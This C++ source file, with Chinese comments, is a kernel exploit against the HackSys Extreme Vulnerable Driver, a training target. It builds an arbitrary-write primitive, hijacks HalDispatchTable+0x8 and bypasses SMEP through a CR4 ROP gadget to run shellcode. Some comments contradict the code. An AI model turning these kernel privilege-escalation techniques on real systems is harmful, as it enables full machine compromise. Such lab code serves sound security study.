#include "exploit.h"

HANDLE hDevice = NULL;

/*
* initWriteWhatWhereEnvironment:
*	[+] 初始化write-what-where的漏洞环境
* 返回值:
*	[+] True: 初始化失败
*	[+] False: 初始化成功
*/
BOOL initWriteWhatWhereEnvironment()
{
	BOOL bReturn = FALSE;
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << "[+] HEVD not exist" << std::endl;
	}
	else
	{
		std::cout << "[+] Keep Go Go Go" << std::endl;
		bReturn = TRUE;
	}

	return bReturn;
}

/*
* write_what_where_dword:
*	[+] 构建一个对任意地址写入dword的机会
*	[+] UINT64 whereWriteAddress: 写入的地址
*	[+] UINT32 writeWhatValue: 写入的值
*/
VOID write_what_where_dword(UINT64 whereWriteAddress, UINT32 writeWhatValue)
{
	WRITE_WHAT_WHERE exploitStruct = {};
	PULONG_PTR whatPtr = (PULONG_PTR)&writeWhatValue;
	DWORD lpBytesReturned = 0;

	exploitStruct.Where = (PULONG_PTR)whereWriteAddress;
	exploitStruct.What = (PULONG_PTR)whatPtr;

	std::cout << "[+] write at: " << std::hex << whereWriteAddress << std::endl;
	std::cout << "[+] write with: " << std::hex << writeWhatValue << std::endl;

	// 触发漏洞函数获取write_what_where的机会
	DeviceIoControl(hDevice, WIRTE_WHAT_WHERE_IO_NUMBER, &exploitStruct, 0x10, NULL, 0, &lpBytesReturned, NULL);
}

/*
* write_what_where_qword:
*	[+] 构建一个对任意地址写入dword的机会
*	[+] UINT64 whereWriteAddress: 写入的地址
*	[+] UINT32 writeWhatValue: 写入的值
*/
VOID write_what_where_qword(UINT64 whereWriteAddress, UINT64 writeWhatValue)
{
	UINT32 lowValue = writeWhatValue;
	write_what_where_dword(whereWriteAddress, lowValue);

	UINT32 highValue = writeWhatValue >> 0x20;
	write_what_where_dword(whereWriteAddress + 0x4, highValue);
}

/*
* runshellcode:
*	[+] 执行shellcode
*	[+] 替换掉haldispatchtable的0x8
*/
VOID runShellCode()
{
	ULONG_PTR newcr4 = 0x406f8;

	// [+] 写入haldispatchtable+0x8的地址:
	DWORD64 haldispatchOffset8 = getHalDispatchOffset8();
	
	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(GetModuleHandleA((LPCSTR) "ntdll.dll"), "NtQueryIntervalProfile");

	if (!NtQueryIntervalProfile) {
		std::cout << "[+] Get NtQueryIntervalProfile failed" << std::endl;
		return;
	}
	
	// 保存原始的值
	LPVOID lpRealHooAddress = NULL;
	readOOB(haldispatchOffset8, &lpRealHooAddress, sizeof(LPVOID));

	// 写入Hook的值
	writeOOB(haldispatchOffset8, (LPVOID)SMEPRopAddress, sizeof(DWORD64));	// 写入地址 以绕过SMEP
	Sleep(50);
	NtQueryIntervalProfile(0x100300, (PULONG)&newcr4);	// 传入参数控制shellcode地址
	Sleep(50);														// 恢复原始的值
	writeOOB(haldispatchOffset8, (LPVOID)lpRealHooAddress, sizeof(DWORD64));
}

